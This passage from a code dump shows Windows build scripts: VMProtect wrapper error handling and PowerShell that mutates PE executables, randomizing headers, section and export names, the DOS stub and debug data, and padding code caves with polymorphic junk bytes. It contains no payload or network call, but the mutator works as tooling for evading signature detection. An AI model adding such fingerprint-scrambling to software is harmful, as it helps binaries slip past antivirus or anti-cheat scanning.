echo   %C_RED%Error: VMProtect Console Not Found.%C_RESET%
echo   %C_YELLOW%       Searched:%C_RESET%
echo         %PROGRAMFILES%\VMProtect*\VMProtect_Con.exe
echo         %PROGRAMW6432%\VMProtect*\VMProtect_Con.exe
echo         %PROGRAMFILES(X86)%\VMProtect*\VMProtect_Con.exe
echo         %LOCALAPPDATA%\VMProtect*\VMProtect_Con.exe
echo         PATH ^(VMProtect_Con.exe, vmpconsole.exe^)
echo   %C_YELLOW%       Fix: Set AMEGER_VMP_CON to the full path, with no surrounding quotes,%C_RESET%
echo   %C_YELLOW%             e.g. set AMEGER_VMP_CON=C:\Program Files\VMProtect Ultimate\VMProtect_Con.exe%C_RESET%
echo   %C_YELLOW%       Leaving It Unset Is Fine If VMProtect Is Installed Normally.%C_RESET%
echo   %C_YELLOW%       Note: The Console Build Is Not Included In The Lite Edition.%C_RESET%
goto :failure

:target_missing
echo   %C_RED%Error: No Launcher EXE Found In The Release Folder.%C_RESET%
goto :failure

:target_ambiguous
echo   %C_RED%Error: Expected Exactly One Launcher EXE In %OUT_ROOT%, found %EXE_CANDIDATES%.%C_RESET%
echo   %C_RED%       Refusing To Guess Which EXE To Protect.%C_RESET%
goto :failure

:project_missing
echo   %C_RED%Error: No .vmp Project Found; Set AMEGER_VMP_PROJECT_EXE.%C_RESET%
goto :failure

:project_mismatch
echo   %C_RED%Error: The Project Does Not Target This Binary.%C_RESET%
echo   %C_RED%       Refusing To Protect With A Crossed Project.%C_RESET%
goto :failure

:work_error
echo   %C_RED%Error: Unable To Prepare The Protection Staging Directory.%C_RESET%
goto :failure

:hash_error
echo   %C_RED%Error: Unable To Calculate A SHA-256 For The Target Or Runtime.%C_RESET%
goto :failure

:output_invalid
echo   %C_RED%Error: VMProtect Output Failed Validation; Release Left Untouched.%C_RESET%
goto :failure

:segment_error
echo   %C_RED%Error: The Protected Launcher Does Not Carry The Generated VMProtect Segment.%C_RESET%
echo   %C_RED%       Release Left Untouched; The Output Was Not Deployed.%C_RESET%
goto :failure

:fc_error
echo   %C_RED%Error: Unable To Compare The Protected Output Against The Source.%C_RESET%
echo   %C_RED%       fc Failed; The Output Is Unverified And Will Not Ship.%C_RESET%
goto :failure

:project_error
echo   %C_RED%Error: Unable To Prepare The Randomized Project Copy.%C_RESET%
goto :failure

:deploy_error
echo   %C_RED%Error: Unable To Deploy The Protected Launcher.%C_RESET%
goto :failure

:embed_error
echo   %C_RED%Error: Embedded Runtime Hash No Longer Matches The Runtime DLL.%C_RESET%
echo   %C_RED%       The Launcher Would Refuse To Start; Rebuild Without Protection.%C_RESET%
goto :failure

:cleanup_error
echo   %C_RED%Error: Unable To Remove Generated Protection Artifacts.%C_RESET%
goto :failure

:failure
if "%NO_PAUSE%"=="0" pause
exit /b 1

```

### Build/Scripts/BuildPE.ps1 â€” 472 lines â€” sha12:432F647E6F16
```powershell
param(
    [Parameter(Mandatory = $true)]
    [string[]]$Files
)

$ErrorActionPreference = "Stop"

$script:UseColor = -not [Console]::IsOutputRedirected

$script:Esc = [char]27
$script:C_Green = "$($script:Esc)[92m"
$script:C_Red = "$($script:Esc)[91m"
$script:C_Yellow = "$($script:Esc)[93m"
$script:C_Dim = "$($script:Esc)[90m"
$script:C_Bold = "$($script:Esc)[1m"
$script:C_Reset = "$($script:Esc)[0m"

function Get-Painted([string]$Color, [string]$Text) {
    if (-not $script:UseColor) { return $Text }
    return ($Color + $Text + $script:C_Reset)
}

function Get-StepCounter([int]$Index, [int]$Total) {
    return ("[" + (Get-Painted $script:C_Green ("{0}" -f $Index)) + "/" + (Get-Painted $script:C_Green ("{0}" -f $Total)) + "]")
}

$IMAGE_NT_SIGNATURE = 0x00004550
$IMAGE_NT_OPTIONAL_HDR64_MAGIC = 0x20B
$IMAGE_SCN_MEM_EXECUTE = 0x20000000

$SectionNamePools = @{
    ".text"  = @(".code", ".exec", ".txts", ".main", ".core")
    ".rdata" = @(".cnst", ".rdat", ".rodt", ".read", ".conf")
    ".data"  = @(".vars", ".heap", ".dats", ".stor", ".memo")
    ".pdata" = @(".xdta", ".pdta", ".ehdt", ".unwd", ".trap")
    ".rsrc"  = @(".icon", ".ress", ".rcdt", ".rbin", ".resx")
    ".reloc" = @(".fixs", ".rloc", ".base", ".relc", ".patc")
    ".edata" = @(".expt", ".xprt", ".symb", ".edta", ".func")
    ".idata" = @(".impt", ".idta", ".deps", ".link", ".refs")
}

$script:AlnumChars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
$script:LinkerMajors = @(14, 15, 16, 17)
$OsVersions = @(
    @{ Major = 10; Minor = 0 }
)

$script:Rng = New-Object Security.Cryptography.RNGCryptoServiceProvider

function Get-RandomBytes([int]$Count) {
    $buf = New-Object byte[] $Count
    $script:Rng.GetBytes($buf)
    return $buf
}

function Get-RandomUInt32 {
    $b = Get-RandomBytes 4
    return [BitConverter]::ToUInt32($b, 0)
}

function Read-UInt32([byte[]]$Data, [int]$Offset) {
    return [BitConverter]::ToUInt32($Data, $Offset)
}

function Write-UInt16([byte[]]$Data, [int]$Offset, [uint16]$Value) {
    $b = [BitConverter]::GetBytes($Value)
    [Array]::Copy($b, 0, $Data, $Offset, 2)
}

function Write-UInt32([byte[]]$Data, [int]$Offset, [uint32]$Value) {
    $b = [BitConverter]::GetBytes($Value)
    [Array]::Copy($b, 0, $Data, $Offset, 4)
}

function Get-SectionName([byte[]]$Data, [int]$SectionOffset) {
    $s = ""
    for ($i = 0; $i -lt 8; $i++) {
        $c = $Data[$SectionOffset + $i]
        if ($c -eq 0) { break }
        $s += [char]$c
    }
    return $s
}

function Set-SectionName([byte[]]$Data, [int]$SectionOffset, [string]$Name) {
    for ($i = 0; $i -lt 8; $i++) { $Data[$SectionOffset + $i] = 0 }
    $n = [Text.Encoding]::ASCII.GetBytes($Name)
    $len = [Math]::Min($n.Length, 8)
    [Array]::Copy($n, 0, $Data, $SectionOffset, $len)
}

function New-RandomSectionName {
    $first = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
    $s = "" + $first[(Get-Random -Maximum $first.Length)]
    for ($i = 1; $i -lt 8; $i++) {
        $s += $script:AlnumChars[(Get-Random -Maximum $script:AlnumChars.Length)]
    }
    return $s
}

function Get-PeLayout([byte[]]$Data) {
    if ($Data.Length -lt 64 -or $Data[0] -ne 77 -or $Data[1] -ne 90) { throw "not MZ" }
    $e = [BitConverter]::ToInt32($Data, 60)
    if ($e -le 0 -or ($e + 6) -gt $Data.Length) { throw "bad e_lfanew" }
    if ([BitConverter]::ToUInt32($Data, $e) -ne $IMAGE_NT_SIGNATURE) { throw "not PE" }
    $coff = $e + 4
    $numSections = [BitConverter]::ToUInt16($Data, $coff + 2)
    if ($numSections -le 0 -or $numSections -gt 96) { throw "bad section count" }
    $optSize = [BitConverter]::ToUInt16($Data, $coff + 16)
    $opt = $e + 24
    if ([BitConverter]::ToUInt16($Data, $opt) -ne $IMAGE_NT_OPTIONAL_HDR64_MAGIC) { throw "not PE32+" }
    $numRva = [BitConverter]::ToUInt32($Data, $opt + 108)
    if ($numRva -gt 16) { throw "bad NumberOfRvaAndSizes" }
    return @{
        NtOffset = $e
        CoffOffset = $coff
        NumSections = $numSections
        OptOffset = $opt
        DataDirOffset = $opt + 112
        SectionTable = $e + 24 + $optSize
    }
}

function Convert-RvaToOffset([byte[]]$Data, $Layout, [uint32]$Rva) {
    for ($i = 0; $i -lt $Layout.NumSections; $i++) {
        $sec = $Layout.SectionTable + ($i * 40)
        $va = Read-UInt32 $Data ($sec + 12)
        $rawSize = Read-UInt32 $Data ($sec + 16)
        $rawPtr = Read-UInt32 $Data ($sec + 20)
        if ($rawSize -gt 0 -and $Rva -ge $va -and $Rva -lt ($va + $rawSize)) {
            return ($rawPtr + ($Rva - $va))
        }
    }
    return -1
}

function Get-PlausibleTimeDateStamp {

    $epoch = [DateTime]::new(1970, 1, 1, 0, 0, 0, [DateTimeKind]::Utc)
    $now = [DateTime]::UtcNow
    $daysBack = Get-Random -Minimum 30 -Maximum 181
    $stamp = $now.AddDays(-$daysBack).AddSeconds(-(Get-Random -Minimum 0 -Maximum 86400))
    $minuteFloor = [DateTime]::new($stamp.Year, $stamp.Month, $stamp.Day, $stamp.Hour, $stamp.Minute, 0, [DateTimeKind]::Utc)
    return [UInt32][int64]($minuteFloor - $epoch).TotalSeconds
}

function Invoke-MutateTimeDateStamp([byte[]]$Data, $Layout) {
    $ts = Get-PlausibleTimeDateStamp
    Write-UInt32 $Data ($Layout.CoffOffset + 4) $ts
    $decoded = [DateTime]::new(1970, 1, 1, 0, 0, 0, [DateTimeKind]::Utc).AddSeconds($ts)
    return ("TimeDateStamp -> 0x{0:X8} ({1:yyyy-MM-dd})" -f $ts, $decoded)
}

function Invoke-MutateChecksum([byte[]]$Data, $Layout) {
    $cs = Get-RandomUInt32
    Write-UInt32 $Data ($Layout.OptOffset + 64) $cs
    return ("Checksum -> 0x{0:X8}" -f $cs)
}

function Invoke-MutateRichHeader([byte[]]$Data, $Layout) {
    $e = $Layout.NtOffset
    $rich = -1
    for ($i = $e - 4; $i -ge 0x80; $i--) {
        if ($Data[$i] -eq 0x52 -and $Data[$i + 1] -eq 0x69 -and $Data[$i + 2] -eq 0x63 -and $Data[$i + 3] -eq 0x68) {
            $rich = $i
            break
        }
    }
    if ($rich -lt 0) { return "Rich Header - Not Found (Skipped)" }
    $xorKey = Read-UInt32 $Data ($rich + 4)

    $dansXored = 0x536E6144 -bxor $xorKey
    $dans = -1
    for ($i = 0x80; $i -lt $rich; $i += 4) {
        if ((Read-UInt32 $Data $i) -eq $dansXored) {
            $dans = $i
            break
        }
    }
    if ($dans -lt 0) { $dans = 0x80 }
    $size = ($rich + 8) - $dans
    $rnd = Get-RandomBytes $size
    [Array]::Copy($rnd, 0, $Data, $dans, $size)
    return ("Rich Header - Destroyed ({0} Bytes Randomized)" -f $size)
}

function Invoke-MutateSectionNames([byte[]]$Data, $Layout) {
    $used = @{}
    for ($i = 0; $i -lt $Layout.NumSections; $i++) {
        $sec = $Layout.SectionTable + ($i * 40)
        $used[(Get-SectionName $Data $sec)] = $true
    }
    $renamed = 0
    for ($i = 0; $i -lt $Layout.NumSections; $i++) {
        $sec = $Layout.SectionTable + ($i * 40)
        $old = Get-SectionName $Data $sec
        $choice = $null
        if ($SectionNamePools.ContainsKey($old)) {
            $alts = $SectionNamePools[$old]
            $pool = @()
            foreach ($a in $alts) { if (-not $used.ContainsKey($a)) { $pool += $a } }
            if ($pool.Count -gt 0) { $choice = $pool[(Get-Random -Maximum $pool.Count)] }
        }
        if ($null -eq $choice) {
            for ($t = 0; $t -lt 32; $t++) {
                $cand = New-RandomSectionName
                if (-not $used.ContainsKey($cand)) { $choice = $cand; break }
            }
        }
        if ($null -eq $choice) { continue }
        $used.Remove($old)
        $used[$choice] = $true
        Set-SectionName $Data $sec $choice
        $renamed++
    }
    return ("Section Names - {0} Sections Renamed" -f $renamed)
}

function Invoke-MutateDebugDirectory([byte[]]$Data, $Layout) {
    $rva = Read-UInt32 $Data ($Layout.DataDirOffset + 48)
    $size = Read-UInt32 $Data ($Layout.DataDirOffset + 52)
    if ($rva -eq 0 -or $size -eq 0) { return "Debug Directory - None Present (Skipped)" }
    $off = Convert-RvaToOffset $Data $Layout $rva
    if ($off -lt 0) { return "Debug Directory - Could Not Resolve RVA (Skipped)" }
    $wiped = 0
    for ($e = $off; ($e + 28) -le ($off + $size); $e += 28) {
        if (($e + 28) -gt $Data.Length) { break }
        $dataSize = Read-UInt32 $Data ($e + 16)
        $dataPtr = Read-UInt32 $Data ($e + 24)
        if ($dataPtr -gt 0 -and $dataSize -gt 0 -and ($dataPtr + $dataSize) -le $Data.Length) {
            $rnd = Get-RandomBytes $dataSize
            [Array]::Copy($rnd, 0, $Data, $dataPtr, $dataSize)
            $wiped++
        }
    }
    Write-UInt32 $Data ($Layout.DataDirOffset + 48) 0
    Write-UInt32 $Data ($Layout.DataDirOffset + 52) 0
    return ("Debug Directory - {0} Entries Wiped" -f $wiped)
}

function Invoke-MutateLinkerVersion([byte[]]$Data, $Layout) {
    $majors = $script:LinkerMajors
    $Data[$Layout.OptOffset + 2] = [byte]$majors[(Get-Random -Maximum $majors.Count)]
    $Data[$Layout.OptOffset + 3] = [byte](Get-Random -Minimum 10 -Maximum 40)
    return ("Linker Version -> {0}.{1}" -f $Data[$Layout.OptOffset + 2], $Data[$Layout.OptOffset + 3])
}

function Invoke-MutateOSVersion([byte[]]$Data, $Layout) {
    $ver = $OsVersions[(Get-Random -Maximum $OsVersions.Count)]
    Write-UInt16 $Data ($Layout.OptOffset + 40) ([uint16]$ver.Major)
    Write-UInt16 $Data ($Layout.OptOffset + 42) ([uint16]$ver.Minor)
    Write-UInt16 $Data ($Layout.OptOffset + 44) ([uint16]$ver.Major)
    Write-UInt16 $Data ($Layout.OptOffset + 46) ([uint16]$ver.Minor)
    Write-UInt16 $Data ($Layout.OptOffset + 48) ([uint16]$ver.Major)
    Write-UInt16 $Data ($Layout.OptOffset + 50) ([uint16]$ver.Minor)
    return ("OS Version -> {0}.{1}" -f $ver.Major, $ver.Minor)
}

function Get-ExceptionRanges([byte[]]$Data, $Layout) {
    $ranges = New-Object System.Collections.ArrayList
    $rva = Read-UInt32 $Data ($Layout.DataDirOffset + 24)
    $size = Read-UInt32 $Data ($Layout.DataDirOffset + 28)
    if ($rva -eq 0 -or $size -lt 12) { return $ranges }
    $off = Convert-RvaToOffset $Data $Layout $rva
    if ($off -lt 0) { return $ranges }
    $count = [int]($size / 12)
    for ($i = 0; $i -lt $count; $i++) {
        $rec = $off + ($i * 12)
        if (($rec + 12) -gt $Data.Length) { break }
        $begin = Read-UInt32 $Data $rec
        $end = Read-UInt32 $Data ($rec + 4)
        if ($end -le $begin) { continue }
        [void]$ranges.Add(@{ Begin = $begin; End = $end })
    }

    return ($ranges | Sort-Object -Property Begin)
}

function Invoke-MutatePolymorphicJunk([byte[]]$Data, $Layout) {

    $nops = @(
        @(0x90),
        @(0x66, 0x90),
        @(0x0F, 0x1F, 0x00),
        @(0x0F, 0x1F, 0x40, 0x00),
        @(0x66, 0x0F, 0x1F, 0x44, 0x00, 0x00),
        @(0x48, 0x87, 0xC0),
        @(0x48, 0x89, 0xC0),
        @(0x48, 0x8D, 0x00)
    )
    $filled = 0
    $exceptions = @(Get-ExceptionRanges $Data $Layout)

    $padRun = [regex]'[\x00\xCC]{64,}'

    for ($i = 0; $i -lt $Layout.NumSections; $i++) {
        $sec = $Layout.SectionTable + ($i * 40)
        $chars = Read-UInt32 $Data ($sec + 36)
        if (($chars -band $IMAGE_SCN_MEM_EXECUTE) -eq 0) { continue }
        $rawPtr = Read-UInt32 $Data ($sec + 20)
        $rawSize = Read-UInt32 $Data ($sec + 16)
        if ($rawSize -eq 0) { continue }
        $end = $rawPtr + $rawSize
        if ($end -gt $Data.Length) { $end = $Data.Length }
        if ($end -le $rawPtr) { continue }
        $secVa = Read-UInt32 $Data ($sec + 12)

        $secHasExceptions = $false
        foreach ($r in $exceptions) {
            if ($r.Begin -ge $secVa -and $r.Begin -lt ($secVa + $rawSize)) { $secHasExceptions = $true; break }
        }
        if (-not $secHasExceptions) { continue }

        $seg = [byte[]]::new($end - $rawPtr)
        [Array]::Copy($Data, $rawPtr, $seg, 0, $seg.Length)
        $text = [System.Text.Encoding]::GetEncoding(28591).GetString($seg)

        foreach ($m in $padRun.Matches($text)) {
            $runBegin = [uint32]($secVa + $m.Index)
            $runEnd = [uint32]($runBegin + $m.Length)

            $cursor = $runBegin
            foreach ($r in $exceptions) {
                if ($r.End -le $cursor) { continue }
                if ($r.Begin -ge $runEnd) { break }
                if ($r.Begin -gt $cursor) {
                    $gap = $r.Begin - $cursor
                    if ($gap -ge 64) {
                        $from = $rawPtr + ($cursor - $secVa)
                        $filled += Set-CaveBytes $Data $from ($from + $gap) $nops
                    }
                }
                if ($r.End -gt $cursor) { $cursor = $r.End }
            }
            if ($runEnd -gt $cursor) {
                $gap = $runEnd - $cursor
                if ($gap -ge 64) {
                    $from = $rawPtr + ($cursor - $secVa)
                    $filled += Set-CaveBytes $Data $from ($from + $gap) $nops
                }
            }
        }
    }
    return ("Polymorphic Junk - {0} Bytes Filled In Code Caves" -f $filled)
}

function Set-CaveBytes([byte[]]$Data, [int]$From, [int]$To, $Patterns) {
    $n = 0
    $pos = $From
    while ($pos -lt $To) {
        $pat = $Patterns[(Get-Random -Maximum $Patterns.Count)]
        if (($pos + $pat.Count) -le $To) {
            for ($k = 0; $k -lt $pat.Count; $k++) { $Data[$pos + $k] = [byte]$pat[$k] }
            $pos += $pat.Count
            $n += $pat.Count
        } else {
            $Data[$pos] = 0x90
            $pos++
            $n++
        }
    }
    return $n
}

function Invoke-MutateBuildGUID([byte[]]$Data, $Layout) {
    $last = $Layout.SectionTable + (($Layout.NumSections - 1) * 40)
    $rawPtr = Read-UInt32 $Data ($last + 20)
    $rawSize = Read-UInt32 $Data ($last + 16)
    if ($rawSize -lt 16 -or ($rawPtr + $rawSize) -gt $Data.Length) {
        return "Build GUID - No Room In Last Section (Skipped)"
    }
    for ($i = $rawPtr + $rawSize - 16; $i -lt $rawPtr + $rawSize; $i++) {
        if ($Data[$i] -ne 0) { return "Build GUID - Slack Not Zeroed (Skipped)" }
    }
    $guid = Get-RandomBytes 16
    [Array]::Copy($guid, 0, $Data, ($rawPtr + $rawSize - 16), 16)
    $hex = ([BitConverter]::ToString($guid) -replace "-", "")
    return ("Build GUID -> {0}" -f $hex)
}

function Invoke-MutateDOSStub([byte[]]$Data, $Layout) {
    $e = $Layout.NtOffset
    $from = 0x40
    $to = $e
    if (($to - $from) -lt 16) { return "DOS Stub - Too Small To Randomize (Skipped)" }
    $rnd = Get-RandomBytes ($to - $from)
    [Array]::Copy($rnd, 0, $Data, $from, ($to - $from))
    return ("DOS Stub - {0} Bytes Randomized" -f ($to - $from))
}

function Invoke-MutateExportName([byte[]]$Data, $Layout) {

    $rva = Read-UInt32 $Data ($Layout.DataDirOffset + 0)
    $size = Read-UInt32 $Data ($Layout.DataDirOffset + 4)
    if ($rva -eq 0 -or $size -lt 40) { return "Export Name - None Present (Skipped)" }
    $off = Convert-RvaToOffset $Data $Layout $rva
    if ($off -lt 0 -or ($off + 40) -gt $Data.Length) { return "Export Name - Could Not Resolve RVA (Skipped)" }
    $nameRva = Read-UInt32 $Data ($off + 12)
    $nameOff = Convert-RvaToOffset $Data $Layout $nameRva
    if ($nameOff -lt 0 -or $nameOff -ge $Data.Length) { return "Export Name - Could Not Resolve Name (Skipped)" }
    $len = 0
    while (($nameOff + $len) -lt $Data.Length -and $Data[$nameOff + $len] -ne 0) { $len++ }
    if ($len -lt 5) { return "Export Name - Name Too Short (Skipped)" }
    $letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
    $alnum = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
    $Data[$nameOff] = [byte][char]$letters[(Get-Random -Maximum $letters.Length)]
    for ($i = 1; $i -lt $len; $i++) {
        $Data[$nameOff + $i] = [byte][char]$alnum[(Get-Random -Maximum $alnum.Length)]
    }
    return ("Export Name - {0} Chars Randomized" -f $len)
}

$failed = $false
try {
    foreach ($f in $Files) {
        if (-not (Test-Path -LiteralPath $f)) {
            Write-Host ("  " + (Get-Painted $script:C_Red ("[x] File Not Found: " + $f)))
            $failed = $true
            continue
        }

        $done = $false
        $bytes = $null
        for ($attempt = 1; $attempt -le 20 -and -not $done; $attempt++) {
            try {
                $bytes = [IO.File]::ReadAllBytes($f)
                $done = $true
            } catch {
                $chain = $_.Exception
                while ($chain -and -not ($chain -is [System.IO.IOException])) { $chain = $chain.InnerException }
                if ($chain -and $attempt -lt 20) {
                    Start-Sleep -Milliseconds 500
                } else {
                    Write-Host ("  " + (Get-Painted $script:C_Red ("[x] Read Failed: " + $f + " : " + $_.Exception.Message)))
                    $failed = $true
                    break
                }
            }
        }
        if (-not $done) { continue }

        try {
            $layout = Get-PeLayout $bytes
        } catch {
            Write-Host ("  " + (Get-Painted $script:C_Red ("[x] Not A Valid PE32+ File: " + $f + " : " + $_.Exception.Message)))
            $failed = $true
            continue
        }

        $steps = @(
            @{ N = 1; T = "TimeDateStamp"; F = { Invoke-MutateTimeDateStamp $bytes $layout }.GetNewClosure() },
            @{ N = 2; T = "Checksum"; F = { Invoke-MutateChecksum $bytes $layout }.GetNewClosure() },
            @{ N = 3; T = "Rich Header"; F = { Invoke-MutateRichHeader $bytes $layout }.GetNewClosure() },
            @{ N = 4; T = "Section Names"; F = { Invoke-MutateSectionNames $bytes $layout }.GetNewClosure() },
            @{ N = 5; T = "Debug Directory"; F = { Invoke-MutateDebugDirectory $bytes $layout }.GetNewClosure() },
            @{ N = 6; T = "Linker Version"; F = { Invoke-MutateLinkerVersion $bytes $layout }.GetNewClosure() },
            @{ N = 7; T = "OS Version"; F = { Invoke-MutateOSVersion $bytes $layout }.GetNewClosure() },
            @{ N = 8; T = "Polymorphic Junk"; F = { Invoke-MutatePolymorphicJunk $bytes $layout }.GetNewClosure() },
            @{ N = 9; T = "Build GUID"; F = { Invoke-MutateBuildGUID $bytes $layout }.GetNewClosure() },
            @{ N = 10; T = "DOS Stub"; F = { Invoke-MutateDOSStub $bytes $layout }.GetNewClosure() },
            @{ N = 11; T = "Export Name"; F = { Invoke-MutateExportName $bytes $layout }.GetNewClosure() }
        )

        $total = $steps.Count
        Write-Host ""
        Write-Host ("  " + (Get-Painted $script:C_Bold "Mutating:") + " " + (Get-Painted $script:C_Dim $f))
        Write-Host ""

        $applied = 0
        $skipped = 0
        $failedSteps = 0
        foreach ($s in $steps) {
            try {
                $r = & $s.F
                $tint = $script:C_Dim
                if ($r -like "*Skipped*") { $tint = $script:C_Yellow; $skipped++ }
                else { $applied++ }
                Write-Host ("    " + (Get-StepCounter $s.N $total) + " " + (Get-Painted $tint $r))
            } catch {
                $failedSteps++
                $failed = $true
                Write-Host ("    " + (Get-StepCounter $s.N $total) + " " + (Get-Painted $script:C_Red ("Failed: " + $_.Exception.Message)))
            }
        }

        try {
            $check = Get-PeLayout $bytes
            if ($check.NumSections -ne $layout.NumSections) { throw "Section Count Changed" }
        } catch {
            Write-Host ("  " + (Get-Painted $script:C_Red ("[x] Post-Mutation Validation Failed: " + $_.Exception.Message)))
            $failed = $true
            continue
        }

        $written = $false
        for ($attempt = 1; $attempt -le 20 -and -not $written; $attempt++) {
            try {
                [IO.File]::WriteAllBytes($f, $bytes)
                $written = $true
            } catch {
                $chain = $_.Exception
                while ($chain -and -not ($chain -is [System.IO.IOException])) { $chain = $chain.InnerException }
                if ($chain -and $attempt -lt 20) {
                    Start-Sleep -Milliseconds 500
                } else {
                    Write-Host ("  " + (Get-Painted $script:C_Red ("[x] Write Failed: " + $f + " : " + $_.Exception.Message)))
                    $failed = $true
                    break
                }
            }
        }
        if ($written) {

            $tail = (Get-Painted $script:C_Green ("{0}" -f $applied)) + "/" +
                    (Get-Painted $script:C_Green ("{0}" -f $total)) + " Mutations Applied"
            if ($skipped -gt 0) { $tail += (", " + $skipped + " Skipped") }
            if ($failedSteps -gt 0) { $tail += (", " + $failedSteps + " Failed") }
            Write-Host ""
            Write-Host ("  " + (Get-Painted $script:C_Green "[+]") + " " + $tail + " " + (Get-Painted $script:C_Dim $f))
        }
    }
} finally {
    $script:Rng.Dispose()
}
if ($failed) { exit 1 }

```

### Build/Scripts/BuildVMP.ps1 â€” 118 lines â€” sha12:E5D5EF1927DF
```powershell
param(
    [Parameter(Mandatory = $true)][string]$Project,
    [Parameter(Mandatory = $true)][string]$Out,

    [string]$Target,

    [switch]$PackOnly
)

$ErrorActionPreference = 'Stop'

if (-not (Test-Path -LiteralPath $Project)) { Write-Host "  [!] Project Not Found: $Project"; exit 1 }

$text = [IO.File]::ReadAllText($Project)

$alphabet = 'ABCDEFGHJKLMNPQRSTUVWXYZ'
$name = '.' + (-join (1..4 | ForEach-Object { $alphabet[[int](Get-Random -Maximum $alphabet.Length)] }))

if ($text -notmatch 'VMCodeSectionName="[^"]*"') {
    Write-Host "  [!] No VMCodeSectionName Attribute In $Project"
    exit 1
}

$rewritten = [regex]::Replace($text, 'VMCodeSectionName="[^"]*"', 'VMCodeSectionName="' + $name + '"')

$before = ([regex]::Match($text, 'InputFileName="([^"]+)"')).Groups[1].Value
$after = ([regex]::Match($rewritten, 'InputFileName="([^"]+)"')).Groups[1].Value
if ($before -ne $after) { Write-Host '  [!] InputFileName Changed During Rewrite'; exit 1 }

if ($PackOnly) {
    if ($rewritten -match '(?s)<Procedures>.*?</Procedures>') {
        $rewritten = [regex]::Replace($rewritten, '(?s)<Procedures>.*?</Procedures>', '<Procedures />', 1)
    } elseif ($rewritten -notmatch '<Procedures\s*/>') {
        $rewritten = [regex]::Replace($rewritten, '(<Protection\b[^>]*>)', ('$1' + "`r`n        <Procedures />"), 1)
    }
    Write-Host 'KEPT='
    Write-Host 'DROPPED='
}

elseif ($Target -and (Test-Path -LiteralPath $Target)) {
    try {
        $b = [IO.File]::ReadAllBytes($Target)
        if ($b.Length -lt 64 -or $b[0] -ne 0x4D -or $b[1] -ne 0x5A) { throw 'Not MZ' }
        $e = [BitConverter]::ToInt32($b, 0x3C)
        if ($e -lt 0 -or ($e + 24) -gt $b.Length) { throw 'Bad e_lfanew' }
        if ([BitConverter]::ToUInt32($b, $e) -ne 0x00004550) { throw 'Not PE' }
        $coff = $e + 4
        $nsec = [BitConverter]::ToUInt16($b, $coff + 2)
        $optSize = [BitConverter]::ToUInt16($b, $coff + 16)
        $opt = $e + 24
        $magic = [BitConverter]::ToUInt16($b, $opt)
        $dd = if ($magic -eq 0x20B) { $opt + 112 } elseif ($magic -eq 0x10B) { $opt + 96 } else { throw 'Not PE32/PE32+' }
        $secBase = $opt + $optSize
        $sizeOfImage = [BitConverter]::ToUInt32($b, $opt + 56)
        $expRva = [BitConverter]::ToUInt32($b, $dd + 0)

        $r2o = {
            param($rva)
            for ($i = 0; $i -lt $nsec; $i++) {
                $o = $secBase + 40 * $i
                $va = [BitConverter]::ToUInt32($b, $o + 12)
                $vs = [BitConverter]::ToUInt32($b, $o + 8)
                $ptr = [BitConverter]::ToUInt32($b, $o + 20)
                $sz = [BitConverter]::ToUInt32($b, $o + 16)
                $sp = [Math]::Max($vs, $sz)
                if ($rva -ge $va -and $rva -lt ($va + $sp)) { return ($rva - $va) + $ptr }
            }
            return -1
        }

        $names = New-Object System.Collections.Generic.HashSet[string]
        if ($expRva -ne 0) {
            $eo = & $r2o $expRva
            if ($eo -ge 0) {
                $nNames = [BitConverter]::ToUInt32($b, $eo + 24)
                $anRva = [BitConverter]::ToUInt32($b, $eo + 32)
                $anOff = & $r2o $anRva
                if ($anOff -ge 0) {
                    for ($i = 0; $i -lt $nNames; $i++) {
                        $nr = [BitConverter]::ToUInt32($b, $anOff + 4 * $i)
                        $no = & $r2o $nr
                        if ($no -ge 0) {
                            $len = 0
                            while (($no + $len) -lt $b.Length -and $b[$no + $len] -ne 0) { $len++ }
                            [void]$names.Add([Text.Encoding]::ASCII.GetString($b, $no, $len).ToLowerInvariant())
                        }
                    }
                }
            }
        }

        $procRx = '(?s)<Procedure\b[^>]*\bMapAddress="([^"]*)"[^>]*/>'
        $elems = [regex]::Matches($rewritten, $procRx)
        if ($elems.Count -gt 0) {
            $keepElems = New-Object System.Collections.Generic.List[string]
            $keepNames = New-Object System.Collections.Generic.List[string]
            $dropNames = New-Object System.Collections.Generic.List[string]
            foreach ($m in $elems) {
                $full = $m.Value
                $addr = $m.Groups[1].Value
                $isEntry = ($addr -ieq 'EntryPoint')
                $isExport = $names.Contains($addr.ToLowerInvariant())
                $resolved = $isEntry -or $isExport
                if (-not $resolved -and $addr -match '^(0[xX])?[0-9A-Fa-f]+$') {

                    $v = 0
                    if ($addr -match '^0[xX]') { [void][int]::TryParse($addr.Substring(2), [Globalization.NumberStyles]::HexNumber, $null, [ref]$v) }
                    else { [void][int]::TryParse($addr, [Globalization.NumberStyles]::Integer, $null, [ref]$v) }
                    if ($v -gt 0 -and $sizeOfImage -gt 0 -and $v -lt $sizeOfImage) { $resolved = $true }
                }
                if ($resolved) { $keepElems.Add($full); $keepNames.Add($addr) }
                else { $dropNames.Add($addr) }
            }
            if ($keepElems.Count -eq 0) {
                $inject = ($elems[0].Value) -replace 'MapAddress="[^"]*"', 'MapAddress="EntryPoint"'
                $keepElems.Add($inject)
                $keepNames.Add('EntryPoint')
            }
            $block = "<Procedures>`r`n            " + ($keepElems -join "`r`n            ") + "`r`n        </Procedures>"
            $rewritten = [regex]::Replace($rewritten, '(?s)<Procedures>.*?</Procedures>',
                [System.Text.RegularExpressions.MatchEvaluator]{ param($mm) $block }, 1)
            if ($dropNames.Count -gt 0) { Write-Host ("DROPPED=" + ($dropNames -join ',')) }
            Write-Host ("KEPT=" + ($keepNames -join ','))
        }
    }
    catch {

        Write-Host ("  [!] Procedure Reconciliation Skipped (Target Parse Failed): " + $_.Exception.Message)
    }
}

[IO.File]::WriteAllText($Out, $rewritten, (New-Object Text.UTF8Encoding($false)))
if (-not (Test-Path -LiteralPath $Out)) { Write-Host '  [!] Failed To Write Rewritten Project'; exit 1 }

Write-Host ("SEG_NAME={0}" -f $name)
exit 0

```

### Build/Scripts/CreateSeeds.ps1 â€” 24 lines â€” sha12:E7AD65F87CE3
```powershell
param()

$ErrorActionPreference = "Stop"

try {
    $rng = New-Object Security.Cryptography.RNGCryptoServiceProvider
    $buf = New-Object byte[] 4
    $rng.GetBytes($buf)
